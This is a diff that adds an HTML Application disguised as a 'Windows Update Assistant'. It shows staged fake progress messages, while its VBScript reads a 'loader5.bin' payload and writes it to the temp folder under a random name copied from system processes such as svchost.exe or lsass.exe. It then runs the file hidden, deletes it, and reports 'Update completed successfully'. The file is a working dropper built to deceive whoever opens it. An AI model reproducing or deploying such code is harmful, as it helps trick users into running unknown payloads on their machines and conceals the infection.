@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Windows Update Assistant</title>
+    <meta charset="UTF-8">
+    <HTA:APPLICATION 
+        ID="WinUpdateAssistant"
+        APPLICATIONNAME="Windows Update Assistant"
+        BORDER="none"
+        BORDERSTYLE="none"
+        CAPTION="no"
+        ICON="shell32.dll,30"
+        SHOWINTASKBAR="yes"
+        SINGLEINSTANCE="yes"
+        SYSMENU="no"
+        WINDOWSTATE="normal"
+        MAXIMIZEBUTTON="no"
+        MINIMIZEBUTTON="no">
+    <style>
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: #0078d7;
+            color: #ffffff;
+            overflow: hidden;
+            width: 100%;
+            height: 100%;
+        }
+        .container {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(135deg, #0078d7 0%, #106ebe 100%);
+        }
+        .content {
+            text-align: center;
+            padding: 30px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            backdrop-filter: blur(10px);
+            max-width: 500px;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 300;
+            margin: 0 0 20px 0;
+        }
+        .logo {
+            font-size: 50px;
+            margin-bottom: 20px;
+        }
+        .progress-container {
+            width: 100%;
+            height: 20px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 10px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #00ff00 0%, #00b050 100%);
+            transition: width 0.5s;
+        }
+        .status {
+            font-size: 14px;
+            margin: 10px 0;
+        }
+        .button {
+            background: rgba(255, 255, 255, 0.2);
+            color: white;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: all 0.3s;
+        }
+        .button:hover {
+            background: rgba(255, 255, 255, 0.3);
+        }
+        .console {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="content">
+            <div class="logo">&#9881;</div>
+            <h1>Windows Update Assistant</h1>
+            <div class="progress-container">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            <div class="status" id="status">Preparing update...</div>
+            <div class="button" onclick="startUpdate()">Start Update</div>
+        </div>
+    </div>
+
+    <div class="console" id="consoleOutput"></div>
+
+    <script language="VBScript">
+        ' Simple function to generate random name
+        Function GenerateName()
+            Dim names
+            names = Array("msedge", "svchost", "runtime", "system", "taskhost", "winlogon", "services", "lsass", "csrss", "smss")
+            Randomize
+            GenerateName = names(Int((UBound(names) + 1) * Rnd)) & ".exe"
+        End Function
+
+        ' Function to read binary file as base64
+        Function ReadFileAsBase64(filename)
+            On Error Resume Next
+            Dim stream, bytes, base64
+            Set stream = CreateObject("ADODB.Stream")
+            stream.Type = 1 ' Binary
+            stream.Open
+            stream.LoadFromFile filename
+            bytes = stream.Read
+            base64 = XML.EncodeBinaryData(bytes)
+            stream.Close
+            Set stream = Nothing
+            ReadFileAsBase64 = base64
+        End Function
+
+        ' Function to decode base64 and write to file
+        Sub WriteBase64ToFile(base64, filename)
+            On Error Resume Next
+            Dim stream, bytes
+            Set stream = CreateObject("ADODB.Stream")
+            stream.Type = 1 ' Binary
+            stream.Open
+            bytes = XML.DecodeBinaryData(base64)
+            stream.Write bytes
+            stream.SaveToFile filename, 2
+            stream.Close
+            Set stream = Nothing
+        End Sub
+
+        ' Function to execute file
+        Sub ExecuteFile(filename)
+            On Error Resume Next
+            Dim shell
+            Set shell = CreateObject("WScript.Shell")
+            shell.Run Chr(34) & filename & Chr(34), 0, False
+            Set shell = Nothing
+        End Sub
+
+        ' Function to update progress
+        Sub UpdateProgress(percent)
+            document.getElementById("progressBar").style.width = CStr(percent) & "%"
+        End Sub
+
+        ' Function to update status
+        Sub UpdateStatus(text)
+            document.getElementById("status").innerText = text
+        End Sub
+
+        ' Main function
+        Sub startUpdate()
+            On Error Resume Next
+            
+            ' Disable button
+            document.getElementsByClassName("button")(0).style.display = "none"
+            
+            ' Step 1: Initializing
+            UpdateStatus "Initializing update components..."
+            UpdateProgress 10
+            Dim waitTime
+            waitTime = Now() + TimeValue("00:00:01")
+            Do While Now() < waitTime
+                Loop
+            
+            ' Step 2: Checking system
+            UpdateStatus "Checking system compatibility..."
+            UpdateProgress 20
+            waitTime = Now() + TimeValue("00:00:01")
+            Do While Now() < waitTime
+                Loop
+            
+            ' Step 3: Downloading updates
+            UpdateStatus "Downloading updates..."
+            UpdateProgress 40
+            waitTime = Now() + TimeValue("00:00:02")
+            Do While Now() < waitTime
+                Loop
+            
+            ' Step 4: Verifying files
+            UpdateStatus "Verifying update files..."
+            UpdateProgress 60
+            waitTime = Now() + TimeValue("00:00:01")
+            Do While Now() < waitTime
+                Loop
+            
+            ' Step 5: Preparing installation
+            UpdateStatus "Preparing installation..."
+            UpdateProgress 80
+            waitTime = Now() + TimeValue("00:00:01")
+            Do While Now() < waitTime
+                Loop
+            
+            ' Step 6: Execute the loader
+            UpdateStatus "Applying updates..."
+            UpdateProgress 90
+            
+            ' Read the loader file
+            Dim base64Data, tempFile
+            base64Data = ReadFileAsBase64("loader5.bin")
+            
+            If Len(base64Data) > 0 Then
+                ' Create a temporary file with a random name
+                tempFile = Environ("TEMP") & "\" & GenerateName()
+                
+                ' Write the decoded data to the temporary file
+                WriteBase64ToFile base64Data, tempFile
+                
+                ' Execute the file
+                ExecuteFile tempFile
+                
+                ' Clean up after execution
+                Dim fso
+                Set fso = CreateObject("Scripting.FileSystemObject")
+                waitTime = Now() + TimeValue("00:00:03")
+                Do While Now() < waitTime
+                    Loop
+                fso.DeleteFile tempFile, True
+                Set fso = Nothing
+            End If
+            
+            ' Step 7: Complete
+            UpdateStatus "Update completed successfully!"
+            UpdateProgress 100
+            waitTime = Now() + TimeValue("00:00:02")
+            Do While Now() < waitTime
+                Loop
+            
+            ' Close the window
+            window.close
+        End Sub
+    </script>
+</body>
+</html>
